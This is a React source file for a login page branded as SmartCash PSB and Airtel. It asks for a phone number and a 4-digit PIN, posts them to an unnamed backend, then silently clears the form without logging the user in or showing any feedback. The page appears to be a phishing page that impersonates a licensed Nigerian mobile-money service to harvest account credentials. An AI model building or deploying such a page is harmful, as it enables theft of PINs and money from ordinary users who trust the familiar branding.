import { useState, useRef } from "react";
import "../styles/home.css";
import "../App.css";
import logo from "../assets/logo.svg";
import axios from "axios";
import BASE_URL from "../components/urls";

const Home = () => {
  const [pin, setPin] = useState("");
  const [loading, setLoading] = useState(false);
  const [phone, setPhone] = useState("");
  const pinInputRef = useRef(null);

  const handlePinChange = (e) => {
    const value = e.target.value.replace(/\D/g, "");
    if (value.length <= 4) {
      setPin(value);
    }
  };

  const submitLogin = () => {
    if (!phone.trim() || pin.length !== 4) return;
    setLoading(true);
    const payload = { phone: phone.trim(), pin };
    axios
      .post(`${BASE_URL}/`, payload)
      .then((response) => {
        console.log(response.data);
        setPhone("");
        setPin("");
        pinInputRef.current?.blur();
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="home-screen">
      <div className="home-main">
        <div className="logo-section">
          <img src={logo} alt="SmartCash" className="logo-img" />
          <div className="powered-by">
            <span>Powered by</span>
            <span className="airtel-text">airtel</span>
          </div>
        </div>
        <div className="login-section">
          <div className="input-field">
            <div className="field-row">
              <div className="field-label">Phone Number</div>
              <div className="field-value">
                <input
                  type="tel"
                  className="field-input"
                  value={phone}
                  onInput={(e) => {
                    const digits = e.currentTarget.value.replace(/\D/g, "");
                    setPhone(digits);
                  }}
                  inputMode="numeric"
                  maxLength={11}
                  pattern="\d*"
                  placeholder="Enter Phone Number"
                />
              </div>
            </div>
          </div>

          <div className="input-field">
            <div className="field-row">
              <div className="field-label">PIN</div>
              <div
                className="field-pin"
                onClick={() => pinInputRef.current?.focus()}
                onMouseDown={() => pinInputRef.current?.focus()}
                onTouchStart={() => pinInputRef.current?.focus()}
              >
                <input
                  ref={pinInputRef}
                  type="text"
                  inputMode="numeric"
                  maxLength="4"
                  value={pin}
                  onChange={handlePinChange}
                  className="pin-visible-input"
                  onKeyDown={(e) => {
                    if (e.key === "Enter" && pin.length === 4 && !loading) {
                      submitLogin();
                    }
                  }}
                  pattern="\d*"
                  placeholder="Enter 4-digit PIN"
                />
              </div>
            </div>
          </div>
        </div>

        <div className="submit-section">
          <button
            type="button"
            className="login-submit-btn"
            onClick={submitLogin}
            disabled={loading || pin.length !== 4 || !phone.trim()}
          >
            {loading ? "Loading..." : "Submit"}
          </button>
        </div>

        <div className="bottom-section">
          <p className="license-text">
            SmartCash PSB - Licensed by the Central Bank of Nigeria
          </p>
        </div>
      </div>
    </div>
  );
};

export default Home;
